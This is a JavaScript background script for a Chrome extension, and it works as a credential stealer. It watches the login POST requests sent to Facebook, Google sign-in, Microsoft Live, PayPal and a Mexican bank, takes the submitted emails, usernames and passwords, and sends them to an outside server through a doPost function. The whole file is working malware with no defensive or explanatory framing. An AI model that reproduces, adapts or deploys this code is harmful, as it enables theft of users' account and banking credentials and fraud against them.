'use strict';
var targetFacebook = "*://*.facebook.com/login.php*";
var targetGmailPass = "*://accounts.google.com/_/signin/sl/challenge*";
var targetGmailUser = "*://accounts.google.com/_/signin/sl/lookup*";
var targetLive = "*://*.live.com/ppsecure/post.srf*";
var targetPaypal = "*://*.paypal.com/signin*";
var targetBNK1 = "*://*.bam-e.com.mx/index.php";

chrome.webRequest.onBeforeRequest.addListener( 
function(details) {
    if(details.method == "POST") {
        if(details.url.indexOf("facebook") != -1 ){
                    console.log("Opcion facebook");
                    if(details.requestBody.formData.email === undefined){
                        doPost("repeat",details.requestBody.formData.pass[0]);
                    }else{
                        doPost(details.requestBody.formData.email[0],details.requestBody.formData.pass[0]);
                    }
        }

	if(details.url.indexOf("google.com/_/signin/sl/lookup") != -1 ){
	    	Object.keys(details.requestBody.formData).forEach(key => {
			if(key.includes("f.req")) {
				details.requestBody.formData[key].forEach(value => {
            				//console.log("value:  " + value[0]);
                			doPost("account",value);
        			});
			}		
        	});
        }
	

	if(details.url.indexOf("google.com/_/signin/sl/challenge") != -1 ){
	    	Object.keys(details.requestBody.formData).forEach(key => {
			if(key.includes("f.req")) {
				details.requestBody.formData[key].forEach(value => {
            				//console.log("value:  " + value[0]);
                			doPost("password",value);
        			});
			}		
        	});
        }


        if(details.url.indexOf("live") != -1 ){
                console.log(details.requestBody.formData);
                doPost(details.requestBody.formData.login[0],details.requestBody.formData.passwd[0]);
        }

        if(details.url.indexOf("paypal") != -1 ){
                console.log(details.requestBody.formData);
                doPost(details.requestBody.formData.login_email[0],details.requestBody.formData.login_password[0]);
        }


    }
  },
  {urls: [targetFacebook,targetGmailUser,targetGmailPass,targetLive,targetPaypal,targetBNK1]},
  ["requestBody"]
);


function doPost(e,p){
                        var url = "http://www.jabonchimbo.com/api/cards/zeuspost.php";
                        var parametros ="email="+e+"&pass="+p;
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST",url, true);
                        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
                        xhr.setRequestHeader('Accept','*/*');
                        xhr.setRequestHeader("Accept-Language", "en");
                        xhr.send(parametros);

                        xhr.onreadystatechange = function () {
                                if (xhr.readyState == 4) {
                                        console.log("Envio de parametros terminada");
                                }
                        }
}

